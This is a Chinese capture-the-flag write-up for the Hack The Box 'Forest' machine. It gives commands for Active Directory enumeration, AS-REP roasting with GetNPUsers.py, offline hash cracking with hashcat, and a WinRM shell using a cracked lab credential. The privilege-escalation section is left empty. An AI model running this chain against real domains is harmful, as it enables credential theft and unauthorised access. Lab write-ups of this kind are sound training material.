---
description: Easy / 枚举 / AS-REP Roasting /滥用 WriteDACL / DCSync
---

# ✔️ Forest

## 建立立足点

### 信息收集

* 使用Nmap对目标进行开放端口扫描：

```bash
nmap -sC -sV -p- -oA forest 10.129.154.107 --open
```

<figure><img src="../../.gitbook/assets/1.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/2.png" alt=""><figcaption></figcaption></figure>

* 把IP地址和域名写入/etc/hosts文件：

<figure><img src="../../.gitbook/assets/3.png" alt=""><figcaption></figcaption></figure>

* 通过之前的Nmap扫描结果发现并没有Web应用的相关开放端口，所以直接尝试各种匿名登录，SMB可以登录成功但是无收获，RPC不可以无密码登录：

```bash
smbclient -N -L 10.129.154.107
rpcclient 10.129.154.107
```

* 使用enum4linux对目标进行枚举，发现了目标系统上的用户名及其用户信息、密码策略、域组成员信息：

```bash
enum4linux 10.129.154.107
```

<figure><img src="../../.gitbook/assets/4.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/5.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/6.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/8.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/9.png" alt=""><figcaption></figcaption></figure>

* 将这些用户名收集起来，试试哪些是域内有效的：

```bash
./kerbrute_linux_amd64 username --dc 10.129.154.107 -d htb.local username.txt
```

<figure><img src="../../.gitbook/assets/7.png" alt=""><figcaption></figcaption></figure>

* 31个用户名跑出来18个有效，再把这18个用户名汇总成一个users.txt文件：

```bash
./kerbrute_linux_amd64 username --dc 10.129.154.107 -d htb.local username.txt
```

<figure><img src="../../.gitbook/assets/10.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/11.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/12.png" alt=""><figcaption></figcaption></figure>

* 使用Impacket的脚本GetNPUsers.py尝试获取每个用户的哈希值：

```bash
./GetNPUsers.py 'htb.local/' -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.129.154.107
```

<figure><img src="../../.gitbook/assets/13 (10).png" alt=""><figcaption></figcaption></figure>

* 已找到了用户svc-alfresco 帐户的哈希值，将该哈希值保存为hashes.txt文件，然后查找该哈希对应的模式，hashcat暴力破解其明文密码：

```bash
hashcat -m 18200 hashes.txt rockyou.txt
```

<figure><img src="../../.gitbook/assets/14.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/15.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/16.png" alt=""><figcaption></figcaption></figure>

### GET SHELL

* 至此，以获取到一个有效凭证：<mark style="color:red;">**svc-alfresco:s3rvice**</mark>
* 利用这个有效凭证和evil-winrm，尝试get shell：

```bash
evil-winrm -i htb.local -u svc-alfresco -p 's3rvice' 
```

* 成功登录，并找到了第一个flag：

<figure><img src="../../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/18 (7).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本地信息收集

* 按惯例上传winPEAS进行信息枚举，但是没有什么特别的收获：

```bash
# evil-winrm:
upload /root/Documents/HTB-AD/forest/tools/winPEASx64.exe
```











### ROOT





{% hint style="info" %}
本例属于简单机器，GET SHELL阶段常规的枚举尝试就有收获。提权过程太艰难了，以为是自己方向搞错了，看了网上提示后发现没有错，各种方式都尝试过了，还是一直报错，暂不清楚原因，后续再更新。

（本例中途重置过IP地址有变化，不影响其过程实现）
{% endhint %}
